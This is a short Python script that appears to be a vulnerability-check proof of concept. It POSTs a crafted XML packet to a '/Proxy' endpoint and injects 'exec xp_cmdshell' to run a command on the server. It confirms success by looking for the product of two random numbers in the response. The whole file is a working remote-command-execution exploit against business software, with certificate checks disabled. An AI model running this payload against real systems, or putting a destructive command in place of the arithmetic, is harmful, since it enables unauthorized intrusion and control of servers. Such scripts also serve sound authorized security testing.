import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(1000, 9999)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(1000, 9999)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"/Proxy"
	body='cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell \'set/A '+str(r1)+'*'+str(r2)+'\'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
			  "Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r1 * r2) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
